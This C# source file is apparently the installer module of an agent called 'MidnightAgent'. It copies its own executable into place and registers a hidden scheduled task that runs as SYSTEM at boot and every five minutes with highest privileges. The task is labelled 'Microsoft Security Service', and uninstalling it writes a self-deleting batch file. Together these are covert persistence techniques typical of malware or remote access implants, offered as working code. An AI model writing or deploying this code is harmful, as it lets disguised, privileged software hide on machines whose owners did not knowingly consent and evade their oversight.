using System;
using System.Diagnostics;
using System.IO;
using MidnightAgent.Core;

namespace MidnightAgent.Installation
{
    /// <summary>
    /// Installer - Install agent as SYSTEM scheduled task
    /// </summary>
    public static class Installer
    {
        /// <summary>
        /// Check if agent is already installed
        /// </summary>
        public static bool IsInstalled()
        {
            try
            {
                // Check if scheduled task exists
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "schtasks.exe",
                        Arguments = $"/Query /TN \"{Config.TaskName}\"",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                proc.WaitForExit();
                return proc.ExitCode == 0;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Install agent as SYSTEM scheduled task
        /// </summary>
        public static bool Install()
        {
            try
            {
                Debug.WriteLine("Starting installation...");

                // 0. Kill any running instances
                try
                {
                    Debug.WriteLine("Killing existing processes...");
                    var processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Config.ExeName));
                    foreach (var proc in processes)
                    {
                        try
                        {
                            proc.Kill();
                            proc.WaitForExit(2000);
                        }
                        catch { }
                    }
                    System.Threading.Thread.Sleep(1000);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Kill process warning: {ex.Message}");
                }

                // 1. Create install folder
                Debug.WriteLine($"Creating folder: {Config.InstallFolder}");
                if (!Directory.Exists(Config.InstallFolder))
                {
                    Directory.CreateDirectory(Config.InstallFolder);
                }

                // 2. Copy executable with retry
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                string targetPath = Config.InstallPath;

                Debug.WriteLine($"Copying: {currentExe} -> {targetPath}");

                // Force delete existing file
                if (File.Exists(targetPath))
                {
                    Debug.WriteLine("Deleting existing file...");
                    for (int i = 0; i < 3; i++)
                    {
                        try
                        {
                            File.SetAttributes(targetPath, FileAttributes.Normal);
                            File.Delete(targetPath);
                            break;
                        }
                        catch
                        {
                            System.Threading.Thread.Sleep(500);
                        }
                    }
                }

                // Copy with retry
                bool copied = false;
                for (int i = 0; i < 3; i++)
                {
                    try
                    {
                        File.Copy(currentExe, targetPath, true);
                        copied = true;
                        Debug.WriteLine("File copied successfully");
                        break;
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Copy attempt {i + 1} failed: {ex.Message}");
                        System.Threading.Thread.Sleep(1000);
                    }
                }

                if (!copied)
                {
                    Debug.WriteLine("Failed to copy file after 3 attempts");
                    return false;
                }

                // 3. Create scheduled task running as SYSTEM
                Debug.WriteLine("Creating scheduled task...");
                bool taskCreated = CreateScheduledTask();

                if (taskCreated)
                {
                    Debug.WriteLine("Installation completed successfully");
                }
                else
                {
                    Debug.WriteLine("Failed to create scheduled task");
                }

                return taskCreated;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Install error: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Uninstall agent
        /// </summary>
        public static bool Uninstall()
        {
            try
            {
                // 1. Delete scheduled task
                DeleteScheduledTask();

                // 2. Delete executable (using delayed delete)
                string batPath = Path.Combine(Path.GetTempPath(), "cleanup.bat");
                string batContent = $@"
@echo off
ping 127.0.0.1 -n 3 > nul
del /f /q ""{Config.InstallPath}""
rmdir ""{Config.InstallFolder}"" 2>nul
del /f /q ""%~f0""
";
                File.WriteAllText(batPath, batContent);

                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c \"{batPath}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });

                return true;
            }
            catch
            {
                return false;
            }
        }

        private static bool CreateScheduledTask()
        {
            try
            {
                // Delete existing task if any
                DeleteScheduledTask();

                // Create new task:
                // - Run as SYSTEM
                // - Trigger: At startup + Every 5 minutes (for reliability)
                // - Run whether user logged on or not
                // - Run with highest privileges

                string xmlPath = Path.Combine(Path.GetTempPath(), "task.xml");
                string taskXml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo>
    <Description>Microsoft Security Service</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id=""Author"">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=""Author"">
    <Exec>
      <Command>""{Config.InstallPath}""</Command>
    </Exec>
  </Actions>
</Task>";

                File.WriteAllText(xmlPath, taskXml);

                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "schtasks.exe",
                        Arguments = $"/Create /XML \"{xmlPath}\" /TN \"{Config.TaskName}\" /F",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                proc.WaitForExit();

                bool created = proc.ExitCode == 0;

                // Cleanup XML
                try { File.Delete(xmlPath); } catch { }

                // Run task immediately if created successfully
                if (created)
                {
                   try
                   {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "schtasks.exe",
                            Arguments = $"/Run /TN \"{Config.TaskName}\"",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        });
                   }
                   catch { }
                }

                return created;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Create task error: {ex.Message}");
                return false;
            }
        }

        private static void DeleteScheduledTask()
        {
            try
            {
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "schtasks.exe",
                        Arguments = $"/Delete /TN \"{Config.TaskName}\" /F",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true
                    }
                };
                proc.Start();
                proc.WaitForExit();
            }
            catch { }
        }
    }
}
